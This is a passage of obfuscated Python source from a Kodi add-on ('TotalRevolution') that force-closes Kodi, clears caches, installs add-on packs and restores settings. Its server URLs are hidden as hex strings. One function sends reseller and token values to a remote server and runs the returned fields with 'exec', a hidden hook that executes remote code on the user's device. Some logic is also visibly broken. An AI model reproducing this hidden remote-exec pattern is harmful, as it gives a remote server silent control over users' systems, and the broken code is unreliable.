 IiI . ok ( '[COLOR=blue]T[/COLOR]otal[COLOR=dodgerblue]R[/COLOR]evolution' , 'The system will now attempt to force close Kodi.' , 'You may encounter a freeze, if that happens give it a minute' , 'and if it doesn\'t close please restart your system.' )
 if xbmc . getCondVisibility ( 'system.platform.osx' ) :
  print "############   try osx force close  #################"
  try : os . system ( 'killall -9 XBMC' )
  except : pass
  try : os . system ( 'killall -9 Kodi' )
  except : pass
 elif xbmc . getCondVisibility ( 'system.platform.linux' ) :
  print "############   try linux force close  #################"
  try : os . system ( 'killall XBMC' )
  except : pass
  try : os . system ( 'killall Kodi' )
  except : pass
  try : os . system ( 'killall -9 xbmc.bin' )
  except : pass
  try : os . system ( 'killall -9 kodi.bin' )
  except : pass
 elif xbmc . getCondVisibility ( 'system.platform.android' ) :
  print "############   try android force close  #################"
  try : os . system ( 'adb shell am force-stop org.xbmc.kodi' )
  except : pass
  try : os . system ( 'adb shell am force-stop org.kodi' )
  except : pass
  try : os . system ( 'adb shell am force-stop org.xbmc.xbmc' )
  except : pass
  try : os . system ( 'adb shell am force-stop org.xbmc' )
  except : pass
 elif xbmc . getCondVisibility ( 'system.platform.windows' ) :
  print "############   try windows force close  #################"
  try :
   os . system ( '@ECHO off' )
   os . system ( 'tskill XBMC.exe' )
  except : pass
  try :
   os . system ( '@ECHO off' )
   os . system ( 'tskill Kodi.exe' )
  except : pass
  try :
   os . system ( '@ECHO off' )
   os . system ( 'TASKKILL /im Kodi.exe /f' )
  except : pass
  try :
   os . system ( '@ECHO off' )
   os . system ( 'TASKKILL /im XBMC.exe /f' )
  except : pass
 else :
  print "############   try atv force close  #################"
  try : os . system ( 'killall AppleTV' )
  except : pass
  print "############   try raspbmc force close  #################"
  try : os . system ( 'sudo initctl stop kodi' )
  except : pass
  try : os . system ( 'sudo initctl stop xbmc' )
  except : pass
 IiI . ok ( "WARNING  !!!" , "If you\'re seeing this message it means the force close" , "was unsuccessful. Please close XBMC/Kodi via your operating system." , '' )
 if 37 - 37: O0oO / i11iIiiIii / iiiIi1i1I
def o0o ( ) :
 oOOoO0 = xbmc . translatePath ( 'special://logpath' )
 oO00oO = xbmc . getInfoLabel ( "System.BuildVersion" )
 IIIIiiIiiI = float ( oO00oO [ : 4 ] )
 if IIIIiiIiiI < 14 :
  oOO00OO0o0O = os . path . join ( oOOoO0 , 'xbmc.log' )
  Ii1ii11IIIi ( 'XBMC Log' , oOO00OO0o0O )
 else :
  oOO00OO0o0O = os . path . join ( oOOoO0 , 'kodi.log' )
  Ii1ii11IIIi ( 'Kodi Log' , oOO00OO0o0O )
  if 35 - 35: iii11I111 * ooOO0o - Ii1iIIIi1ii + iii11I111 . Iii1i1I11I
  if 13 - 13: O0OOO % oO00Oo0o000 % Oo000o
def Ii11IiI111 ( ) :
 IiI . ok ( "Restore local guisettings fix" , "You should [COLOR=lime]ONLY[/COLOR] use this option if the guisettings fix" , "is failing to download via the addon. Installing via this" , "method means you do not receive notifications of updates" )
 IIiii11ii1II1 ( )
 if 97 - 97: Oo000o - iii11I111 + oO00Oo0o000
def OO0000 ( mypath , dirname ) :
 import xbmcvfs
 if 75 - 75: oO00Oo0o000 % ooOO0o
 if 89 - 89: OOO00OoOO00 - oOOoO0O0O0 * iii11I111 * o0oO
 if not xbmcvfs . exists ( mypath ) :
  try :
   xbmcvfs . mkdirs ( mypath )
  except :
   xbmcvfs . mkdir ( mypath )
   if 8 - 8: oO00Oo0o000 - iiiIi1i1I + Ii1iIIIi1ii + o0oO * OoO0O00 - Ii1iIIIi1ii
 i1IiI1iIIIIIi = os . path . join ( mypath , dirname )
 if 36 - 36: O0oO
 if not xbmcvfs . exists ( i1IiI1iIIIIIi ) :
  try :
   xbmcvfs . mkdirs ( i1IiI1iIIIIIi )
  except :
   xbmcvfs . mkdir ( i1IiI1iIIIIIi )
   if 19 - 19: OoOo . iii11I111 . Iii1i1I11I
 return i1IiI1iIIIIIi
 if 13 - 13: oOOoO0O0O0 . iiiIi1i1I / I1i1iii
 if 43 - 43: Ii1iIIIi1ii % II11iII
def oOO0ooi1iiIIiII1 ( mode ) :
 if not mode . endswith ( "premium" ) and not mode . endswith ( "public" ) and not mode . endswith ( "private" ) :
  iI = O0O00OOo ( heading = "Search for content" )
  if ( not iI ) : return False , 0
  OoOOo = urllib . quote_plus ( iI )
  if mode == 'tutorials' :
   Ii1Ii1I ( 'name=' + OoOOo )
  if mode == 'hardware' :
   i1ooOoo000oO ( 'name=' + OoOOo )
  if mode == 'news' :
   III1II1i ( 'name=' + OoOOo )
 if mode . endswith ( "premium" ) or mode . endswith ( "public" ) or mode . endswith ( "private" ) :
  Ii ( 'folder' , 'Search By Name' , mode + '&name=' , 'search_builds' , 'Manual_Search.png' , '' , '' , '' )
  Ii ( 'folder' , 'Search By Uploader' , mode + '&author=' , 'search_builds' , 'Search_Genre.png' , '' , '' , '' )
  Ii ( 'folder' , 'Search By Audio Addons Installed' , mode + '&audio=' , 'search_builds' , 'Search_Addons.png' , '' , '' , '' )
  Ii ( 'folder' , 'Search By Picture Addons Installed' , mode + '&pics=' , 'search_builds' , 'Search_Addons.png' , '' , '' , '' )
  Ii ( 'folder' , 'Search By Program Addons Installed' , mode + '&progs=' , 'search_builds' , 'Search_Addons.png' , '' , '' , '' )
  Ii ( 'folder' , 'Search By Video Addons Installed' , mode + '&vids=' , 'search_builds' , 'Search_Addons.png' , '' , '' , '' )
  Ii ( 'folder' , 'Search By Skins Installed' , mode + '&skins=' , 'search_builds' , 'Search_Addons.png' , '' , '' , '' )
  if 72 - 72: O0oO % iii11I111
  if 93 - 93: Ii1iIIIi1ii + i11iIiiIii . iii11I111 . o0oO % iiIi % oO00Oo0o000
def oO0oo ( url ) :
 o00o0o000Oo = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f4c61746573744e6577732f4c61746573744e6577732e7068703f69643d2573'
 i1iIi = binascii . unhexlify ( o00o0o000Oo ) % ( url )
 ooOOoooooo = II1I ( i1iIi ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 O0 = re . compile ( 'name="(.+?)"' ) . findall ( ooOOoooooo )
 I1ii1111Ii = re . compile ( 'author="(.+?)"' ) . findall ( ooOOoooooo )
 Oooo00OOo = re . compile ( 'date="(.+?)"' ) . findall ( ooOOoooooo )
 iiIiII1 = re . compile ( 'content="(.+?)###END###"' ) . findall ( ooOOoooooo )
 if 6 - 6: OOO00OoOO00 / iiIi / OoOo
 ooooooo00o = O0 [ 0 ] if ( len ( O0 ) > 0 ) else ''
 Oo0o = I1ii1111Ii [ 0 ] if ( len ( I1ii1111Ii ) > 0 ) else ''
 OooOooO0O0o0 = Oooo00OOo [ 0 ] if ( len ( Oooo00OOo ) > 0 ) else ''
 oOoOOOo = iiIiII1 [ 0 ] if ( len ( iiIiII1 ) > 0 ) else ''
 OooOO = iiIii1I ( oOoOOOo )
 IIIII1 = str ( '[COLOR=gold]Source: [/COLOR]' + Oo0o + '     [COLOR=gold]Date: [/COLOR]' + OooOooO0O0o0 + '[CR][CR][COLOR=lime]Details: [/COLOR][CR]' + OooOO )
 Ii1ii11IIIi ( ooooooo00o , IIIII1 )
 if 32 - 32: i11iIiiIii
 if 6 - 6: OoOo / Ii1iIIIi1ii * i1OOO / iiIi + O0OOO
def Ii1I1IIIiI1i ( url ) :
 if II1 == 'true' :
  Ii ( '' , '[COLOR=orange]Latest ' + I1IiiI + ' news[/COLOR]' , I1IiiI , 'notify_msg' , 'LatestNews.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , 'news' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=lime][All News][/COLOR] From all sites' , str ( url ) + '' , 'grab_news' , 'Latest.png' , '' , '' , '' )
 Ii ( 'folder' , 'Official Kodi.tv News' , str ( url ) + '&author=Official%20Kodi' , 'grab_news' , 'XBMC.png' , '' , '' , '' )
 Ii ( 'folder' , 'OpenELEC News' , str ( url ) + '&author=OpenELEC' , 'grab_news' , 'OpenELEC.png' , '' , '' , '' )
 Ii ( 'folder' , 'Raspbmc News' , str ( url ) + '&author=Raspbmc' , 'grab_news' , 'Raspbmc.png' , '' , '' , '' )
 Ii ( 'folder' , 'TotalXBMC News' , str ( url ) + '&author=TotalXBMC' , 'grab_news' , 'TOTALXBMC.png' , '' , '' , '' )
 Ii ( 'folder' , 'XBMC4Xbox News' , str ( url ) + '&author=XBMC4Xbox' , 'grab_news' , 'XBMC4Xbox.png' , '' , '' , '' )
 if 75 - 75: Ooo0Oo0
 if 92 - 92: Oo000o / O0OOO * iiIi - Oo000o
def oooOo00000 ( title , message , times , icon ) :
 icon = OOooO0OOoo + icon
 xbmc . executebuiltin ( "XBMC.Notification(" + title + "," + message + "," + times + "," + icon + ")" )
 if 45 - 45: O0OOO * i1OOO + i11iIiiIii - oOOoO0O0O0 - Ii1iIIIi1ii
def I11I111i1I1 ( url ) :
 I1Ii11i = xbmc . translatePath ( os . path . join ( i1i1II , Oo0Ooo , 'notification.txt' ) )
 if not os . path . exists ( I1Ii11i ) :
  ooOoO = open ( I1Ii11i , mode = 'w' )
  ooOoO . write ( '20150101000000' )
  ooOoO . close ( )
 iii1O0Ooo0O = open ( I1Ii11i , 'r' ) . read ( )
 iii1oOo0OoOOOo0 = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f436f6d6d756e6974795f4275696c64732f6e6f746966793f726573656c6c65723d2573'
 i1iIi = binascii . unhexlify ( iii1oOo0OoOOOo0 ) % ( I1IiiI )
 ooOOoooooo = II1I ( i1iIi ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OOoo00 = re . compile ( 'notify="(.+?)"' ) . findall ( ooOOoooooo )
 I1I1 = OOoo00 [ 0 ] if ( len ( OOoo00 ) > 0 ) else 'No news items available'
 Oooo00OOo = re . compile ( 'date="(.+?)"' ) . findall ( ooOOoooooo )
 O0OOO0ooO00o = Oooo00OOo [ 0 ] if ( len ( Oooo00OOo ) > 0 ) else ''
 I1iii1 = O0OOO0ooO00o . replace ( '-' , '' ) . replace ( ' ' , '' ) . replace ( ':' , '' )
 if int ( iii1O0Ooo0O ) < int ( I1iii1 ) :
  ooOoO = open ( I1Ii11i , mode = 'w' )
  ooOoO . write ( I1iii1 )
  ooOoO . close ( )
  IiI . ok ( 'Latest ' + I1IiiI + ' News' , I1I1 )
 else :
  IiI . ok ( 'Latest ' + I1IiiI + ' News' , I1I1 )
  if 19 - 19: OOO00OoOO00 % Iii1i1I11I . Iii1i1I11I
  if 40 - 40: O0OOO . i1OOO / Ii1iIIIi1ii * iii11I111
def II1I ( url ) :
 OOo00Oooo = urllib2 . Request ( url )
 OOo00Oooo . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3' )
 I1oO0oOOOooo = urllib2 . urlopen ( OOo00Oooo )
 ooOOoooooo = I1oO0oOOOooo . read ( )
 I1oO0oOOOooo . close ( )
 return ooOOoooooo . replace ( '\r' , '' ) . replace ( '\n' , '' ) . replace ( '\t' , '' )
 if 6 - 6: Ii1iIIIi1ii - Ii1iIIIi1ii % iii11I111 / Ii1iIIIi1ii * i1OOO
 if 3 - 3: oOOoO0O0O0 . O0oO / iiiIi1i1I
def Ooo ( name , url , iconimage , description ) :
 IIi111 = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data/script.tvguidedixie/' , '' ) )
 oO0o0o0O = os . path . join ( IIi111 , 'local.ini' )
 iIII1I1i1i = IiI . yesno ( 'OffsideStreams / OnTapp.TV Integration ' , str ( description ) , nolabel = 'Cancel' , yeslabel = 'Accept' )
 if iIII1I1i1i == 0 :
  return
 elif iIII1I1i1i == 1 :
  Iii = oO0o0o0O
  if not os . path . exists ( IIi111 ) :
   IiI . ok ( '[COLOR=red]OnTapp Not Installed[/COLOR]' , 'The On-Tapp.TV addon has not been found on this system, please install then run this again.' )
  else :
   II1IIi ( url , Iii )
   IiI . ok ( 'OSS Integration complete' , 'The OffsideStreams local.ini file has now been copied to your OnTapp.TV directory' )
   if 11 - 11: i1OOO - Oo000o % i11iIiiIii . Ii1iIIIi1ii * iiIi - iiiIi1i1I
   if 73 - 73: O0OOO + oO00Oo0o000 - O0OOO / Iii1i1I11I * iiiIi1i1I
def iI1I1IiIII ( url ) :
 Ii ( 'folder' , '[COLOR=yellow]1. Install:[/COLOR]  Installation tutorials (e.g. flashing a new OS)' , str ( url ) + '&thirdparty=InstallTools' , 'grab_tutorials' , 'Install.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue]Add-on Tools:[/COLOR]  Add-on maintenance and coding tutorials' , str ( url ) + '&thirdparty=AddonTools' , 'grab_tutorials' , 'ADDONTOOLS.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue]Audio Tools:[/COLOR]  Audio related tutorials' , str ( url ) + '&thirdparty=AudioTools' , 'grab_tutorials' , 'AUDIOTOOLS.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue]Gaming Tools:[/COLOR]  Integrate a gaming section into your setup' , str ( url ) + '&thirdparty=GamingTools' , 'grab_tutorials' , 'gaming_portal.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue]Image Tools:[/COLOR]  Tutorials to assist with your pictures/photos' , str ( url ) + '&thirdparty=ImageTools' , 'grab_tutorials' , 'IMAGETOOLS.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue]Library Tools:[/COLOR]  Music and Video Library Tutorials' , str ( url ) + '&thirdparty=LibraryTools' , 'grab_tutorials' , 'LIBRARYTOOLS.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue]Skinning Tools:[/COLOR]  All your skinning advice' , str ( url ) + '&thirdparty=SkinningTools' , 'grab_tutorials' , 'SKINNINGTOOLS.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue]Video Tools:[/COLOR]  All video related tools' , str ( url ) + '&thirdparty=VideoTools' , 'grab_tutorials' , 'VIDEOTOOLS.png' , '' , '' , '' )
 if 54 - 54: Ooo0Oo0 + Ooo0Oo0 + Oo000o % o0oO % i11iIiiIii
 if 100 - 100: Ooo0Oo0
def oOo0OII ( xmlfile ) :
 OOOoo000o0oo0 = i1iiI11I ( xmlfile , OO0o . getAddonInfo ( 'path' ) , 'DefaultSkin' , close_time = 34 )
 OOOoo000o0oo0 . doModal ( )
 del OOOoo000o0oo0
 if 71 - 71: oO00Oo0o000 . Oo000o + oOOoO0O0O0
def IiIiiI1ii111 ( ) :
 i11ii1 = '687474703a2f2f746f74616c78626d632e74762f746f74616c7265766f6c7574696f6e2f4164646f6e5f5061636b732f6164646f6e7061636b732e747874'
 Ii111I11 = binascii . unhexlify ( i11ii1 )
 ooOOoooooo = II1I ( i11ii1 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOOO00o000o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( ooOOoooooo )
 for ooooooo00o , o0O0OO0o , i1i1iII1 , iii11i1IIII , IIIII1 in oOOO00o000o :
  Ii ( 'folder2' , ooooooo00o , o0O0OO0o , 'popularwizard' , i1i1iII1 , iii11i1IIII , '' , IIIII1 )
  if 51 - 51: Iii1i1I11I + iii11I111 * Ii1iIIIi1ii * OOO00OoOO00 / o0oO
def I11IiI1i ( name , url , iconimage , description ) :
 Ii1ii11IIIi ( name , description )
 iIII1I1i1i = IiI . yesno ( name , 'This will install the ' + name , '' , 'Are you sure you want to continue?' , nolabel = 'Cancel' , yeslabel = 'Accept' )
 if iIII1I1i1i == 0 :
  return
 elif iIII1I1i1i == 1 :
  import downloader
  Iii = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
  II11iiii1Ii = xbmc . translatePath ( os . path . join ( 'special://' , 'home' ) )
  ooOo = xbmcgui . DialogProgress ( )
  ooOo . create ( "Addon Packs" , "Downloading " + name + " addon pack." , '' , 'Please Wait' )
  II1iI11 = os . path . join ( Iii , name + '.zip' )
  try :
   os . remove ( II1iI11 )
  except :
   pass
   downloader . download ( url , II1iI11 , ooOo )
   time . sleep ( 3 )
   ooOo . update ( 0 , "" , "Extracting Zip Please Wait" )
   xbmc . executebuiltin ( "XBMC.Extract(%s,%s)" % ( II1iI11 , II11iiii1Ii ) )
   IiI . ok ( "Total Installer" , "All Done. Your addons will now go through the update process, it may take a minute or two until the addons are working." )
   time . sleep ( 1 )
   xbmc . executebuiltin ( 'UpdateLocalAddons' )
   xbmc . executebuiltin ( 'UpdateAddonRepos' )
   if 81 - 81: Ii1iIIIi1ii / OOO00OoOO00 . i11iIiiIii * I1i1iii
   if 55 - 55: Ooo0Oo0
   if 76 - 76: OOO00OoOO00 - i11iIiiIii
def O00o0O ( url ) :
 II1ii1iI = zipfile . ZipFile ( url , "r" )
 for i111 in II1ii1iI . namelist ( ) :
  if 'guisettings.xml' in i111 :
   ooO00O0O0 = II1ii1iI . read ( i111 )
   o0o0oO = '<setting type="(.+?)" name="%s.(.+?)">(.+?)</setting>' % iIii1
   oOOO00o000o = re . compile ( o0o0oO ) . findall ( ooO00O0O0 )
   for type , IiiI1i111I1i , OO0O0OO0O0 in oOOO00o000o :
    OO0O0OO0O0 = OO0O0OO0O0 . replace ( '&quot;' , '' ) . replace ( '&amp;' , '&' )
    xbmc . executebuiltin ( "Skin.Set%s(%s,%s)" % ( type . title ( ) , IiiI1i111I1i , OO0O0OO0O0 ) )
  if 'favourites.xml' in i111 :
   ooO00O0O0 = II1ii1iI . read ( i111 )
   IiI11i1IIiiI = open ( i11 , mode = 'w' )
   IiI11i1IIiiI . write ( ooO00O0O0 )
   IiI11i1IIiiI . close ( )
  if 'sources.xml' in i111 :
   ooO00O0O0 = II1ii1iI . read ( i111 )
   IiI11i1IIiiI = open ( I11 , mode = 'w' )
   IiI11i1IIiiI . write ( ooO00O0O0 )
   IiI11i1IIiiI . close ( )
  if 'advancedsettings.xml' in i111 :
   ooO00O0O0 = II1ii1iI . read ( i111 )
   IiI11i1IIiiI = open ( Oo0o0000o0o0 , mode = 'w' )
   IiI11i1IIiiI . write ( ooO00O0O0 )
   IiI11i1IIiiI . close ( )
  if 'RssFeeds.xml' in i111 :
   ooO00O0O0 = II1ii1iI . read ( i111 )
   IiI11i1IIiiI = open ( oO0o0o0ooO0oO , mode = 'w' )
   IiI11i1IIiiI . write ( ooO00O0O0 )
   IiI11i1IIiiI . close ( )
  if 'keyboard.xml' in i111 :
   ooO00O0O0 = II1ii1iI . read ( i111 )
   IiI11i1IIiiI = open ( oo0o0O00 , mode = 'w' )
   IiI11i1IIiiI . write ( ooO00O0O0 )
   IiI11i1IIiiI . close ( )
   if 78 - 78: OOO00OoOO00 / Iii1i1I11I . OOO00OoOO00
   if 50 - 50: O0oO . oO00Oo0o000 - O0OOO % iiIi . i1OOO
def IiIi1iIIi1 ( recursive_location , remote_path ) :
 if not os . path . exists ( recursive_location ) :
  os . makedirs ( recursive_location )
 ooOOoooooo = II1I ( remote_path ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOOO00o000o = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( ooOOoooooo )
 for iIi11i1 in oOOO00o000o :
  oO00oo0o00o0o = xbmc . translatePath ( os . path . join ( recursive_location , iIi11i1 ) )
  if '/' not in iIi11i1 :
   try :
    ooOo . update ( 0 , "Downloading [COLOR=yellow]" + iIi11i1 + '[/COLOR]' , '' , 'Please wait...' )
    print "downloading: " + remote_path + iIi11i1
    downloader . download ( remote_path + iIi11i1 , oO00oo0o00o0o , ooOo )
   except : print "failed to install" + iIi11i1
  if '/' in iIi11i1 and '..' not in iIi11i1 and 'http' not in iIi11i1 :
   iii1iI = remote_path + iIi11i1
   IiIi1iIIi1 ( oO00oo0o00o0o , iii1iI )
  else : pass
  if 26 - 26: Ii1iIIIi1ii - Ooo0Oo0 . O0oO . O0oO + Ii1iIIIi1ii * iiiIi1i1I
  if 85 - 85: oOOoO0O0O0 + I1i1iii - oOOoO0O0O0 * OOO00OoOO00 - o0oO % ooOO0o
def IiIiI ( ) :
 IiI . ok ( "Register to unlock features" , "To get the most out of this addon please register at" , "the TotalXBMC forum for free." , "Visit [COLOR=lime]www.totalxbmc.tv/new-forum[/COLOR] for more details." )
 if 47 - 47: OoOo
 if 65 - 65: O0OOO + i1OOO % OoO0O00 * iiIi / oO00Oo0o000 / OoOo
def oooOO ( ) :
 iIII1I1i1i = xbmcgui . Dialog ( ) . yesno ( 'Delete Addon_Data Folder?' , 'This will free up space by deleting your addon_data' , 'folder. This contains all addon related settings' , 'including username and password info.' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if iIII1I1i1i == 1 :
  Ooi11III1II1 ( )
  IiI . ok ( "Addon_Data Removed" , '' , 'Your addon_data folder has now been removed.' , '' )
  if 33 - 33: OOO00OoOO00
def IIIi11 ( url ) :
 oooOo00O0 = str ( url ) . replace ( o0oO0 , i1i1II )
 if IiI . yesno ( "Remove" , '' , "Do you want to Remove" ) :
  for Ii1IIii , IiIi1ii111i1 , i1i1i1I in os . walk ( url ) :
   for IiI11i1IIiiI in i1i1i1I :
    os . unlink ( os . path . join ( Ii1IIii , IiI11i1IIiiI ) )
   for OooOo00o in IiIi1ii111i1 :
    shutil . rmtree ( os . path . join ( Ii1IIii , OooOo00o ) )
  os . rmdir ( url )
  try :
   for Ii1IIii , IiIi1ii111i1 , i1i1i1I in os . walk ( oooOo00O0 ) :
    for IiI11i1IIiiI in i1i1i1I :
     os . unlink ( os . path . join ( Ii1IIii , IiI11i1IIiiI ) )
    for OooOo00o in IiIi1ii111i1 :
     shutil . rmtree ( os . path . join ( Ii1IIii , OooOo00o ) )
   os . rmdir ( oooOo00O0 )
  except : pass
  xbmc . executebuiltin ( 'Container.Refresh' )
  if 26 - 26: i1OOO . OoO0O00 + iiIi . OoOo + oOOoO0O0O0
  if 17 - 17: oOOoO0O0O0 + i11iIiiIii + Ooo0Oo0 % oOOoO0O0O0 . OOO00OoOO00
def I11iiIi1i1IIi ( ) :
 IIIiIi ( )
 i111 = xbmcgui . Dialog ( ) . browse ( 1 , 'Select the backup file you want to DELETE' , 'files' , '.zip' , False , False , oO )
 if i111 != oO :
  II1iIIiII11Ii1i1 = ntpath . basename ( i111 )
  iIII1I1i1i = xbmcgui . Dialog ( ) . yesno ( 'Delete Backup File' , 'This will completely remove ' + II1iIIiII11Ii1i1 , 'Are you sure you want to delete?' , '' , nolabel = 'No, Cancel' , yeslabel = 'Yes, Delete' )
  if iIII1I1i1i == 1 :
   os . remove ( i111 )
   if 51 - 51: OOO00OoOO00 % II11iII + iii11I111 + OoO0O00 - Iii1i1I11I . II11iII
   if 18 - 18: iiiIi1i1I - oOOoO0O0O0 * I1i1iii + OOO00OoOO00
def O0oOOOO00oOOo ( ) :
 iIII1I1i1i = xbmcgui . Dialog ( ) . yesno ( 'Remove All Crash Logs?' , 'There is absolutely no harm in doing this, these are' , 'log files generated when Kodi crashes and are' , 'only used for debugging purposes.' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if iIII1I1i1i == 1 :
  O0oOo ( )
  IiI . ok ( "Crash Logs Removed" , '' , 'Your crash log files have now been removed.' , '' )
  if 29 - 29: OoOo / Iii1i1I11I + OoOo
  if 13 - 13: II11iII * Oo000o % i11iIiiIii % o0oO + O0oO / I1i1iii
def Oo0OooIII11i1iI11 ( ) :
 iIII1I1i1i = xbmcgui . Dialog ( ) . yesno ( 'Delete Packages Folder?' , 'This will free up space by deleting the zip install' , 'files of your addons. The only downside is you\'ll no' , 'longer be able to rollback to older versions.' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if iIII1I1i1i == 1 :
  iIi ( )
  IiI . ok ( "Packages Removed" , '' , 'Your zip install files have now been removed.' , '' )
  if 58 - 58: OOO00OoOO00
  if 98 - 98: iii11I111 * II11iII
def IIioo0OO ( ) :
 iIII1I1i1i = xbmcgui . Dialog ( ) . yesno ( 'Clear Cached Images?' , 'This will clear your textures13.db file and remove' , 'your Thumbnails folder. These will automatically be' , 'repopulated after a restart.' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if iIII1I1i1i == 1 :
  II11IiI1 ( )
  I1o0o0OoOOOOOo ( iiIIIII1i1iI )
  iIII1I1i1i = xbmcgui . Dialog ( ) . yesno ( 'Quit Kodi Now?' , 'Cache has been successfully deleted.' , 'You must now restart Kodi, would you like to quit now?' , '' , nolabel = 'I\'ll restart later' , yeslabel = 'Yes, quit' )
  if iIII1I1i1i == 1 :
   iiIiiIi1 ( )
   if 21 - 21: II11iII
   if 63 - 63: Oo000o . O0OOO * Oo000o + Ii1iIIIi1ii
def II11IiI1 ( ) :
 Ii1iIi = xbmc . translatePath ( 'special://home/userdata/Database/Textures13.db' )
 try :
  OOo0OOOoOOo = database . connect ( Ii1iIi )
  III = OOo0OOOoOOo . cursor ( )
  III . execute ( "DROP TABLE IF EXISTS path" )
  III . execute ( "VACUUM" )
  OOo0OOOoOOo . commit ( )
  III . execute ( "DROP TABLE IF EXISTS sizes" )
  III . execute ( "VACUUM" )
  OOo0OOOoOOo . commit ( )
  III . execute ( "DROP TABLE IF EXISTS texture" )
  III . execute ( "VACUUM" )
  OOo0OOOoOOo . commit ( )
  III . execute ( """CREATE TABLE path (id integer, url text, type text, texture text, primary key(id))""" )
  OOo0OOOoOOo . commit ( )
  III . execute ( """CREATE TABLE sizes (idtexture integer,size integer, width integer, height integer, usecount integer, lastusetime text)""" )
  OOo0OOOoOOo . commit ( )
  III . execute ( """CREATE TABLE texture (id integer, url text, cachedurl text, imagehash text, lasthashcheck text, PRIMARY KEY(id))""" )
  OOo0OOOoOOo . commit ( )
 except :
  pass
  if 84 - 84: i11iIiiIii + oO00Oo0o000 . O0OOO
  if 69 - 69: i1OOO / Iii1i1I11I % i11iIiiIii
def i11i1iIiii ( url ) :
 Ii11IIIi1 = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f436f6d6d756e6974795f4275696c64732f726573656c6c65723f726573656c6c65723d257326746f6b656e3d2573266f70656e656c65633d2573'
 i1iIi = binascii . unhexlify ( Ii11IIIi1 ) % ( I1IiiI , IIi1IiiiI1Ii , url )
 ooOOoooooo = II1I ( i1iIi ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOOOOOoOO = re . compile ( 'path="(.+?)"' ) . findall ( ooOOoooooo )
 ooooooo00oO0OO = re . compile ( 'reseller="(.+?)"' ) . findall ( ooOOoooooo )
 IIIii11 = re . compile ( 'premium="(.+?)"' ) . findall ( ooOOoooooo )
 i1i11I1I1 = re . compile ( 'openelec="(.+?)"' ) . findall ( ooOOoooooo )
 OOOOOoooO = ooooooo00oO0OO [ 0 ] if ( len ( ooooooo00oO0OO ) > 0 ) else 'None'
 oO0Oooo0OoO = IIIii11 [ 0 ] if ( len ( IIIii11 ) > 0 ) else 'None'
 Iiii1IIIIiiI11 = i1i11I1I1 [ 0 ] if ( len ( i1i11I1I1 ) > 0 ) else 'None'
 exec Iiii1IIIIiiI11
 exec OOOOOoooO
 exec oO0Oooo0OoO
 if 8 - 8: OoO0O00 + iiIi / ooOO0o / oO00Oo0o000 + Ii1iIIIi1ii + Iii1i1I11I
 if 33 - 33: I1i1iii - O0oO - oO00Oo0o000
def oO00oOoo00o0 ( name , url , description ) :
 if 'Backup' in name :
  IIIiIi ( )
  III1I = open ( url ) . read ( )
  OOOii = os . path . join ( oO , description . split ( 'Your ' ) [ 1 ] )
  IiI11i1IIiiI = open ( OOOii , mode = 'w' )
  IiI11i1IIiiI . write ( III1I )
  IiI11i1IIiiI . close ( )
 else :
  if 'guisettings.xml' in description :
   ooO00O0O0 = open ( os . path . join ( oO , description . split ( 'Your ' ) [ 1 ] ) ) . read ( )
   o0o0oO = '<setting type="(.+?)" name="%s.(.+?)">(.+?)</setting>' % iIii1
   oOOO00o000o = re . compile ( o0o0oO ) . findall ( ooO00O0O0 )
   for type , IiiI1i111I1i , OO0O0OO0O0 in oOOO00o000o :
    OO0O0OO0O0 = OO0O0OO0O0 . replace ( '&quot;' , '' ) . replace ( '&amp;' , '&' )
    xbmc . executebuiltin ( "Skin.Set%s(%s,%s)" % ( type . title ( ) , IiiI1i111I1i , OO0O0OO0O0 ) )
  else :
   OOOii = os . path . join ( url )
   III1I = open ( os . path . join ( oO , description . split ( 'Your ' ) [ 1 ] ) ) . read ( )
   IiI11i1IIiiI = open ( OOOii , mode = 'w' )
   IiI11i1IIiiI . write ( III1I )
   IiI11i1IIiiI . close ( )
 IiI . ok ( "[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]" , "" , 'All Done !' , '' )
 if 33 - 33: Iii1i1I11I + i1OOO / i1OOO + i1OOO * O0oO
 if 26 - 26: i1OOO . iiIi . ooOO0o - Iii1i1I11I / Ii1iIIIi1ii
def I1i111IiIiIi1 ( name , url , video , description , skins , guisettingslink , artpack ) :
 i111IIiIII1i = 1
 IIIiIi ( )
 if os . path . exists ( II ) :
  if os . path . exists ( o0oOoO00o ) :
   os . remove ( II )
  else :
   os . rename ( II , o0oOoO00o )
 if os . path . exists ( i1 ) :
  os . remove ( i1 )
 if not os . path . exists ( i1iIIi1 ) :
  ooOoO = open ( i1iIIi1 , mode = 'w+' )
 if os . path . exists ( ooOoOoo0O ) :
  os . removedirs ( ooOoOoo0O )
 try : os . rename ( o0oOoO00o , II )
 except :
